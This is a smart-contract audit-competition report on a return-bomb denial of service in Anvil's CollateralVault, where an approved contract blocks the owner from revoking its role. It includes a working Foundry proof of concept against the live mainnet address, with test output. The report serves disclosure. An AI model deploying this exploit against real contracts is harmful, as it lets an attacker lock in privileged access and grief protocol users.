# #36092 \[SC-Insight] Collateralizable Contracts May Retain Status Unconditionally

**Submitted on Oct 19th 2024 at 00:52:12 UTC by @auditweiler for** [**Audit Comp | Anvil**](https://immunefi.com/audit-competition/audit-comp-anvil)

* **Report ID:** #36092
* **Report Type:** Smart Contract
* **Report severity:** Insight
* **Target:** <https://etherscan.io/address/0x5d2725fdE4d7Aa3388DA4519ac0449Cc031d675f>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
  * Unbounded gas consumption

## Description

## Brief/Intro

Once assigned the \`collateralizableContract\` role, this contract can prevent retain the protocol administrator from ever removing the role.

## Vulnerability Details

The role of the \`collateralizableContract\` within the \`CollateralVault\` is extremely valuable, as it provides the elevated permission to interact with user collateral reservations.

Through the use of a [Return Bomb Attack](https://github.com/nomad-xyz/ExcessivelySafeCall), a \`CollateralizableContract\` can exploit the ERC-165 \`supportsInterface(bytes4)\` call to enact denial of service on the protocol \`owner()\` whenever they attempt to remove this status:

\`\`\`solidity function upsertCollateralizableContractApprovals( CollateralizableContractApprovalConfig\[] calldata \_updates ) external onlyOwner { for (uint256 i = 0; i < \_updates.length; i++) { address contractAddress = \_updates\[i].collateralizableAddress; if (contractAddress == address(0)) revert InvalidTargetAddress(contractAddress); collateralizableContracts\[contractAddress] = \_updates\[i].isApproved;

```
        bool isCollateralPool;
        try IERC165(contractAddress).supportsInterface(type(ICollateralPool).interfaceId) {
            // NB: We have to get the returndata this way because if contractAddress does not implement IERC165,
            // it will not return a boolean, so adding &#x60;returns (bool isCollateralPool)&#x60; to the try above reverts.
            assembly (&quot;memory-safe&quot;) {
                // Booleans, despite being a single bit, are ABI-encoded to a full 32-byte word.
                if eq(returndatasize(), 0x20) {
                    // Memory at byte indexes 0-64 are to be used as &quot;scratch space&quot; -- perfect for this use.
                    returndatacopy(0, 0, 0x20)
                    // Since this block could be hit by any fallback function that returns 32-bytes (i.e. an integer),
                    // do a check for exactly 1 when setting &#x60;isCollateralPool&#x60;. Note: fallback functions should not
                    // return data, and the consequences of getting this wrong are extremely minor and off-chain.
                    if eq(mload(0), 1) {
                        isCollateralPool :&#x3D; true
                    }
                }
            }
```

@> } catch (bytes memory) { @> // contractAddress does not implement IERC165. \`isCollateralPool\` should be false in this case @> }

```
        emit CollateralizableContractApprovalUpdated(_updates[i].isApproved, contractAddress, isCollateralPool);
    }
```

} \`\`\`

Notice that in the \`catch\` clause of the call to \`supportsInterface\`, the \`bytes memory\` variable remains. Although the variable is unnamed, this implementation specifically instructs the Solidity compiler to load the entirety of the returned data into memory, even though it is unused.

Consequently, a malicious contract can force the call to \`upsertCollateralizableContractApprovals\` to \`revert\` by specifying an execessively large amount of data to return *from within the parent call context*.

This renders the \`upsertCollateralizableContractApprovals\` function impotent, enabling the \`collateralizableContract\` to retain it's role.

## Impact Details

The valuable \`collateralizableContract\` role can be held indefnitely. In the context of a batch upgrade, a malicious \`CollateralizableContract\` may also prevent competing \`collateralizableContract\`s from being approved.

As the \`CollateralVault\` itself is immutable, the role will be held indefinitely.

## References

<https://etherscan.io/address/0x5d2725fdE4d7Aa3388DA4519ac0449Cc031d675f?utm\\_source=immunefi#code>

## Proof of Concept

## Proof of Concept

In Foundry, run the following test using:

\`\`\`shell forge test -vv \`\`\`

\> Note, you'll need to define a mainnet \`ETH\_RPC\_URL\`.

\`\`\`solidity // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

/// @notice A contract which DOSs the \`CollateralVault\` if /// @notice it attempts to no longer mark them as a /// @notice \`CollateralizableContract\`. contract ImmortalCollateralizable { address internal immutable \_COLLATERAL\_VAULT;

```
constructor(address collateralVault) {
    _COLLATERAL_VAULT &#x3D; collateralVault;
}

function supportsInterface(bytes4) external view returns (bool) {
    // Check to see if the sender is the &#x60;CollateralVault&#x60;.
    if (msg.sender &#x3D;&#x3D; _COLLATERAL_VAULT) {
        bool success;
        bytes memory data;
        (success, data) &#x3D; _COLLATERAL_VAULT.staticcall(
            abi.encodeWithSignature(
                &quot;collateralizableContracts(address)&quot;,
                address(this)
            )
        );
        require(success);

        // Check to see if we are being configured to be no longer
        // recognized as &#x60;Collateralizable&#x60;.
        if (!abi.decode(data, (bool))) {
            // Make the attempt to remove us fail via
            // a returnbomb attack.
            assembly {
                revert(0, 1000000)
            }
        }
    }
    return true;
}
```

}

contract ImmortalCollateralizableTest is Test { struct CollateralizableContractApprovalConfig { address collateralizableAddress; bool isApproved; }

```
address internal _owner;
address internal _collateralVault;
address internal _collateralizableAddress;

function setUp() external returns (bool success, bytes memory data) {
    vm.createSelectFork(vm.envString(&quot;ETH_RPC_URL&quot;));
    _collateralVault &#x3D; 0x5d2725fdE4d7Aa3388DA4519ac0449Cc031d675f;
    _collateralizableAddress &#x3D; address(
        new ImmortalCollateralizable({collateralVault: _collateralVault})
    );
    (success, data) &#x3D; _collateralVault.staticcall(
        abi.encodeWithSignature(&quot;owner()&quot;)
    );
    require(success);
    _owner &#x3D; abi.decode(data, (address));
}

function modifyCollateralizableApprovalStatus(bool isApproved) external {
    vm.startPrank(_owner);
    CollateralizableContractApprovalConfig[]
        memory collateralizableContractApprovalConfigs &#x3D; new CollateralizableContractApprovalConfig[](
            1
        );
    collateralizableContractApprovalConfigs[
        0
    ] &#x3D; CollateralizableContractApprovalConfig({
        collateralizableAddress: _collateralizableAddress,
        isApproved: isApproved
    });
    (bool success, ) &#x3D; _collateralVault.call(
        abi.encodeWithSignature(
            &quot;upsertCollateralizableContractApprovals((address,bool)[])&quot;,
            collateralizableContractApprovalConfigs
        )
    );
    require(success);
    vm.stopPrank();
}

/// @notice A collateralizable contract can maintain its
/// @notice status as collateralizable indefinitely through
/// @notice the use of a returnbomb.
/// @dev We&#x27;ll be using a realistic amount of callgas to
/// @dev demonstrate the vulnerability.
function testImmortalCollateralizable() external {
    /// @notice We can successfully assign the privileged role:
    this.modifyCollateralizableApprovalStatus{gas: 100_000}({
        isApproved: true
    });
    console.log(&quot;Approval status assignment succeeded!&quot;);
    /// @notice However, attempts to unset the role can be locked forever:
    vm.expectRevert();
    this.modifyCollateralizableApprovalStatus{gas: 100_000}({
        isApproved: false
    });
    console.log(&quot;Approval status removal failed!&quot;);
}
```

} \`\`\`

This should result in the following output, demonstrating the \`collateralizableContract\` role can be retained:

\`\`\`shell Ran 1 test for test/Counter.t.sol:ImmortalCollateralizableTest \[PASS] testImmortalCollateralizable() (gas: 149659) Logs: Approval status assignment succeeded! Approval status removal failed!

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.89s (488.07ms CPU time)

Ran 1 test suite in 2.05s (1.89s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests) \`\`\`
